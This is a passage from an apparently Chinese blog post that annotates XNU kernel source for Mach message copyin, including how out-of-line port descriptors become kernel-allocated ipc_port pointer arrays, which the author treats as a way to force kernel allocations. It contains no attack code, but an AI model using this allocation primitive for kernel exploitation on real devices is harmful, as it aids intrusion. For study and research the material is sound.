CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_remote_port);</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_local_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_local_port);</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_voucher_port = legacy_base.header.msgh_voucher_port;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_id = legacy_base.header.msgh_id;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. copy userspace mach body to kernel</span></span><br><span class="line">    <span class="keyword">if</span> (copyinmsg(msg_addr, (<span class="keyword">char</span> *)(kmsg-&gt;ikm_header + <span class="number">1</span>), <span class="built_in">size</span> - (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">mach_msg_header_t</span>))) &#123;</span><br><span class="line">    	ipc_kmsg_free(kmsg);</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_INVALID_DATA;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. init kmsg trailer</span></span><br><span class="line">    trailer = (<span class="keyword">mach_msg_max_trailer_t</span> *) ((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="built_in">size</span>);</span><br><span class="line">    trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;</span><br><span class="line">    trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;</span><br><span class="line">    trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;</span><br><span class="line">    trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span><br><span class="line">    trailer-&gt;msgh_labels.sender = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    *kmsgp = kmsg;</span><br><span class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个 kmsg 的构造过程较为复杂，主要包含了 4 步：</p>
<ol>
<li>在内核中新建一个 <code>mach_msg_legacy_base_t</code> 对象，它实际上是一个 mach_message 的基本结构，随后将用户空间的 mach header 和 body 通过 <code>copyinmsg</code> 复制到 <code>mach_msg_legacy_base_t</code> 对象，主要目的是在方便在内核中获取消息的 mach 数据结构；<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">mach_msg_legacy_header_t</span>    header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span>             body;</span><br><span class="line">&#125; <span class="keyword">mach_msg_legacy_base_t</span>;</span><br></pre></td></tr></table></figure></li>
<li>创建一个 kmsg 数据结构，kmsg 包含了 mach 消息的全部数据，并包含了额外的 buffer 来兼容 64 位系统向 32 位系统发送消息的情况；</li>
<li>将用户空间的 mach 消息体拷贝到 kmsg；</li>
<li>初始化 kmsg 的 trailler，trailler 是一个位于 kmsg 尾部的变长数据结构，用于携带一些额外信息。</li>
</ol>
<p>这部分最复杂的部分是第 2 步 kmsg 的创建，其复杂性在于对整个 kmsg 空间的构造，涉及大量的地址与尺寸计算，由于整个过程十分冗长无聊，这里直接给出结论，有兴趣的读者可以顺着方法自己构造一遍整个 kmsg 数据体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> *  |-kmsg(84)-|---body(60)---|-mach_msg_hdr(24)-|-mach_msg_body(4)-|-descriptor(16)-|-trailer(0x44)-|</span></span><br><span class="line"><span class="comment"> *      |                       ^</span></span><br><span class="line"><span class="comment"> *      |                       |</span></span><br><span class="line"><span class="comment"> *   ikm_header ----------------|</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>可见用户空间发送的 mach message 结构被放置在了 kmsg body 后面，包含 header, body 和 descriptor 三部分，随后跟着一个 trailer。</p>
<p>事实上，body 区域是被预留的，用于处理 kmsg 无法完整容纳下 descriptor 的情况，这一点在 <code>ipc_kmsg_alloc</code> 开头的注释中可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * LP64support -</span></span><br><span class="line"><span class="comment"> * Pad the allocation in case we need to expand the</span></span><br><span class="line"><span class="comment"> * message descrptors for user spaces with pointers larger than</span></span><br><span class="line"><span class="comment"> * the kernel's own, or vice versa.  We don't know how many descriptors</span></span><br><span class="line"><span class="comment"> * there are yet, so just assume the whole body could be</span></span><br><span class="line"><span class="comment"> * descriptors (if there could be any at all).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The expansion space is left in front of the header,</span></span><br><span class="line"><span class="comment"> * because it is easier to pull the header and descriptors</span></span><br><span class="line"><span class="comment"> * forward as we process them than it is to push all the</span></span><br><span class="line"><span class="comment"> * data backwards.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>即当用户空间的 descriptor 比内核空间大时，我们可以将 kmsg 从 <code>mach_msg_header</code> 开始整体左移，为 descriptor 空出空间。之所以在左侧预留空间是因为 kmsg 后面的内存空间可能已被占用，将 header 向前拉要比向后推动要更简单。</p>
<h2 id="将用户空间的-mach-message-剩余部分复制到-kmsg"><a href="#将用户空间的-mach-message-剩余部分复制到-kmsg" class="headerlink" title="将用户空间的 mach message 剩余部分复制到 kmsg"></a>将用户空间的 mach message 剩余部分复制到 kmsg</h2><p>构造好了 kmsg 以后，我们只完成了 header 和 body 的复制，其中 body 包含了 descriptor 的信息，接下来的工作是通过 <code>ipc_kmsg_copyin</code> 函数赋值余下的部分，并为 OOL Message 中的 OOL Memory 转化为 in-line memory。</p>
<p>我们先来看 <code>ipc_kmsg_copyin</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_copyin(</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span>		kmsg,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_msg_priority_t</span>     <span class="keyword">override</span>,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span>	*optionp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_msg_return_t</span> mr;</span><br><span class="line">    </span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_bits &amp;= MACH_MSGH_BITS_USER;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. copy header rights</span></span><br><span class="line">    mr = ipc_kmsg_copyin_header(kmsg, space, <span class="keyword">override</span>, optionp);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS)</span><br><span class="line">    <span class="keyword">return</span> mr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((kmsg-&gt;ikm_header-&gt;msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. copy body</span></span><br><span class="line">    mr = ipc_kmsg_copyin_body(kmsg, space, <span class="built_in">map</span>, optionp);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要包含两个步骤：</p>
<ol>
<li>复制用户空间的 mach message rights 到 kmsg，这里的 rights 指的是 port 的发送和接收能力；</li>
<li>复制 descriptor 到 kmsg，并根据 descriptor 对 OOL Memory 创建相应的内核空间完成地址空间的转换。</li>
</ol>
<p>这里重点讲一下步骤 2，它是能迫使内核完成从 port 句柄到 port address 转换和指针分配的关键，下面是笔者<strong>在 arm64 和 上述 OOL Message 方式调用条件下去掉一些边界判断后精简的</strong> <code>ipc_kmsg_copyin_body</code> 内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_copyin_body(</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span>	kmsg,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>	space,</span><br><span class="line">	<span class="keyword">vm_map_t</span>    <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span> *optionp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ipc_object_t</span> dest;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span>	*body;</span><br><span class="line">    <span class="keyword">mach_msg_descriptor_t</span> *user_addr, *kern_addr;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> dsc_count;</span><br><span class="line">    <span class="keyword">boolean_t</span> is_task_64bit = (<span class="built_in">map</span>-&gt;max_offset &gt; VM_MAX_ADDRESS);</span><br><span class="line">    <span class="keyword">boolean_t</span> <span class="built_in">complex</span> = FALSE;</span><br><span class="line">    <span class="keyword">vm_size_t</span> space_needed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">vm_offset_t</span>	paddr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">vm_map_copy_t</span> copy = VM_MAP_COPY_NULL;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> i;</span><br><span class="line">    <span class="keyword">mach_msg_return_t</span> mr = MACH_MSG_SUCCESS;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. init descriptor size</span></span><br><span class="line">    <span class="keyword">vm_size_t</span> descriptor_size = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="keyword">ipc_object_t</span>) kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">    body = (<span class="keyword">mach_msg_body_t</span> *) (kmsg-&gt;ikm_header + <span class="number">1</span>);</span><br><span class="line">    dsc_count = body-&gt;msgh_descriptor_count;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Make an initial pass to determine kernal VM space requirements for</span></span><br><span class="line"><span class="comment">     * physical copies and possible contraction of the descriptors from</span></span><br><span class="line"><span class="comment">     * processes with pointers larger than the kernel's.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    daddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dsc_count; i++) &#123;</span><br><span class="line">        <span class="comment">/* make sure the descriptor fits in the message */</span></span><br><span class="line">        descriptor_size += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Allocate space in the pageable kernel ipc copy map for all the</span></span><br><span class="line"><span class="comment">     * ool data that is to be physically copied.  Map is marked wait for</span></span><br><span class="line"><span class="comment">     * space.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (space_needed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vm_allocate_kernel(ipc_kernel_copy_map, &amp;paddr, space_needed,</span><br><span class="line">                    VM_FLAGS_ANYWHERE, VM_KERN_MEMORY_IPC) != KERN_SUCCESS) &#123;</span><br><span class="line">            mr = MACH_MSG_VM_KERNEL;</span><br><span class="line">            <span class="keyword">goto</span> clean_message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* user_addr = just after base as it was copied in */</span></span><br><span class="line">    user_addr = (<span class="keyword">mach_msg_descriptor_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. pull header forward if needed</span></span><br><span class="line">    <span class="comment">/* Shift the mach_msg_base_t down to make room for dsc_count*16bytes of descriptors */</span></span><br><span class="line">    <span class="keyword">if</span> (descriptor_size != <span class="number">16</span> * dsc_count) &#123;</span><br><span class="line">        <span class="keyword">vm_offset_t</span> dsc_adjust = <span class="number">16</span> * dsc_count - descriptor_size;</span><br><span class="line">        memmove((<span class="keyword">char</span> *)(((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header) - dsc_adjust), kmsg-&gt;ikm_header, <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">        kmsg-&gt;ikm_header = (<span class="keyword">mach_msg_header_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header - dsc_adjust);</span><br><span class="line">        <span class="comment">/* Update the message size for the larger in-kernel representation */</span></span><br><span class="line">        kmsg-&gt;ikm_header-&gt;msgh_size += (<span class="keyword">mach_msg_size_t</span>)dsc_adjust;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* kern_addr = just after base after it has been (conditionally) moved */</span></span><br><span class="line">    kern_addr = (<span class="keyword">mach_msg_descriptor_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. copy ool ports to kernel zone</span></span><br><span class="line">    <span class="comment">/* handle the OOL regions and port descriptors. */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dsc_count; i++) &#123;</span><br><span class="line">        user_addr = ipc_kmsg_copyin_ool_ports_descriptor((<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *)kern_addr, </span><br><span class="line">    			            user_addr, is_task_64bit, <span class="built_in">map</span>, space, dest, kmsg, optionp, &amp;mr);</span><br><span class="line">        kern_addr++;</span><br><span class="line">        <span class="built_in">complex</span> = TRUE;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">complex</span>) &#123;</span><br><span class="line">        kmsg-&gt;ikm_header-&gt;msgh_bits &amp;= ~MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mr;</span><br></pre></td></tr></table></figure>
<p>这个函数较为复杂，笔者在其中用注释标出了 3 个关键步骤：</p>
<ol>
<li>初始化 descriptor size，它是 <code>mach_msg_ool_ports_descriptor_t</code> 的用户空间大小；</li>
<li>如果发现 kmsg 容纳不了用户空间的 <code>mach_msg_ool_ports_descriptor_t</code>，将 kmsg 从 header 开始整体往前移动，为 descriptor 留下足够的空间，这与上文中提到的 kmsg body expand size 描述一致；</li>
<li>将 ool ports 拷贝到内核地址空间，这其中包含了从 port 句柄到 ipc_port address 的转换。</li>
</ol>
<p>由于我们的 body 只包含了一个 descriptor，且用户空间尺寸与内核空间中一致，因此不需要 pull header forward，接下来我们终于来到了本文的重头戏：ool ports 转换。</p>
<p>port 句柄到地址的转换是通过调用 <code>ipc_kmsg_copyin_ool_ports_descriptor</code> 函数完成的，下面我们看一下该函数的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_descriptor_t</span> *</span><br><span class="line">ipc_kmsg_copyin_ool_ports_descriptor(</span><br><span class="line">	<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *dsc,</span><br><span class="line">	<span class="keyword">mach_msg_descriptor_t</span> *user_dsc,</span><br><span class="line">	<span class="keyword">int</span> is_64bit,</span><br><span class="line">	<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">ipc_space_t</span> space,</span><br><span class="line">	<span class="keyword">ipc_object_t</span> dest,</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span> kmsg,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span> *optionp,</span><br><span class="line">	<span class="keyword">mach_msg_return_t</span> *mr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">ipc_object_t</span> *objects;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">mach_vm_offset_t</span> addr;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> user_disp;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> result_disp;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> count;</span><br><span class="line">    <span class="keyword">mach_msg_copy_options_t</span> copy_option;</span><br><span class="line">    <span class="keyword">boolean_t</span> deallocate;</span><br><span class="line">    <span class="keyword">mach_msg_descriptor_type_t</span> type;</span><br><span class="line">    <span class="keyword">vm_size_t</span> ports_length, names_length;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_msg_ool_ports_descriptor64_t</span> *user_ool_dsc = (typeof(user_ool_dsc))user_dsc;</span><br><span class="line">    addr = (<span class="keyword">mach_vm_offset_t</span>)user_ool_dsc-&gt;address;</span><br><span class="line">    count = user_ool_dsc-&gt;count;</span><br><span class="line">    deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">    copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">    user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">    type = user_ool_dsc-&gt;type;</span><br><span class="line">    </span><br><span class="line">    user_dsc = (typeof(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    dsc-&gt;deallocate = deallocate;</span><br><span class="line">    dsc-&gt;copy = copy_option;</span><br><span class="line">    dsc-&gt;type = type;</span><br><span class="line">    dsc-&gt;count = count;</span><br><span class="line">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span><br><span class="line">    </span><br><span class="line">    result_disp = ipc_object_copyin_type(user_disp);</span><br><span class="line">    dsc-&gt;disposition = result_disp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. calculate port_pointers length and port_names length</span></span><br><span class="line">    <span class="comment">/* calculate length of data in bytes, rounding up */</span></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_t</span>), &amp;ports_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>), &amp;names_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. alloc kenrel zone for port pointers</span></span><br><span class="line">    data = kalloc(ports_length);</span><br><span class="line">    <span class="keyword">mach_port_name_t</span> *names = &amp;((<span class="keyword">mach_port_name_t</span> *)data)[count];</span><br><span class="line">    <span class="keyword">if</span> (copyinmap(<span class="built_in">map</span>, addr, names, names_length) != KERN_SUCCESS) &#123;</span><br><span class="line">        kfree(data, ports_length);</span><br><span class="line">        *mr = MACH_SEND_INVALID_MEMORY;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (deallocate) &#123;</span><br><span class="line">        (<span class="keyword">void</span>) mach_vm_deallocate(<span class="built_in">map</span>, addr, (<span class="keyword">mach_vm_size_t</span>)ports_length);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    objects = (<span class="keyword">ipc_object_t</span> *) data;</span><br><span class="line">    <span class="comment">// 3. 替换 ool address 为 kernel address</span></span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">mach_port_name_t</span> name = names[i];</span><br><span class="line">        <span class="keyword">ipc_object_t</span> object;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (<span class="keyword">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. convert port_name to port_addr</span></span><br><span class="line">        <span class="keyword">kern_return_t</span> kr = ipc_object_copyin(space, name, user_disp, &amp;object);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> j;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                object = objects[j];</span><br><span class="line">                <span class="keyword">if</span> (IPC_OBJECT_VALID(object))</span><br><span class="line">                    ipc_object_destroy(object, result_disp);</span><br><span class="line">            &#125;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">            dsc-&gt;address = <span class="literal">NULL</span>;</span><br><span class="line">    		<span class="keyword">if</span> ((*optionp &amp; MACH_SEND_KERNEL) == <span class="number">0</span>) &#123;</span><br><span class="line">    			mach_port_guard_exception(name, <span class="number">0</span>, <span class="number">0</span>, kGUARD_EXC_SEND_INVALID_RIGHT);</span><br><span class="line">    		&#125;</span><br><span class="line">            *mr = MACH_SEND_INVALID_RIGHT;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp;</span><br><span class="line">                ipc_port_check_circularity(</span><br><span class="line">                    (<span class="keyword">ipc_port_t</span>) object,</span><br><span class="line">                    (<span class="keyword">ipc_port_t</span>) dest))</span><br><span class="line">            kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR;</span><br><span class="line">    </span><br><span class="line">        objects[i] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> user_dsc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码同样十分复杂，笔者在其中标出了 4 个关键步骤：</p>
<ol>
<li>计算 <code>ipc_port pointer</code> 所需要的空间大小，以及用户空间中 <code>mach_port</code>  句柄数组的大小；</li>
<li>在内核中分配空间用于容纳从句柄数组转换而来的 <code>ipc_port pointer</code> 数组，这个地方的 <code>ports_length</code> 有些费解，理论上应该计算 <code>count * sizeof(mach_port_t *)</code>，如果采用 <code>count * sizeof(mach_port_t)</code> 作为 kalloc 参数如何能装下 pointers 呢？是不是 kalloc 有一些特殊的内存分配规则，望高人指点；</li>
<li>替换 kmsg 中的 ool address 为步骤 2 中分配的 kernel address；</li>
<li>完成从 port 句柄到 port address 的转换。</li>
</ol>
<p>这其中的重点是步骤 4，它通过调用 <code>ipc_object_copyin</code> 将一个句柄转化为 <code>ipc_port pointer</code>，我们来看它的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_object_copyin(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name,</span><br><span class="line">	<span class="keyword">mach_msg_type_name_t</span>	msgt_name,</span><br><span class="line">	